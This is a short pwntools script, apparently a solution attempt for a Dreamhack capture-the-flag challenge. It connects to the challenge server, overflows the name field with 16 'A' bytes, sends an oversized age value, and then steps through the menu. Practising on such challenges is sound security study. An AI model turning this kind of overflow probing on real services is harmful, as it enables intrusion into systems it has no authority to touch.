from pwn import *

r=remote("host2.dreamhack.games",21942)
print("remote success")
a='A'*16
b=str(10000000000)
print(b)
print(r.recvuntil("> "))
r.sendline('1')
print(r.recvuntil("Name: "))
r.send(a)
print(r.recvuntil("Age: "))
r.sendline(b)

print(r.recvuntil("> "))
r.sendline('3')

print(r.recvuntil("> "))
r.sendline('2')

print(r.recvuntil("> "))









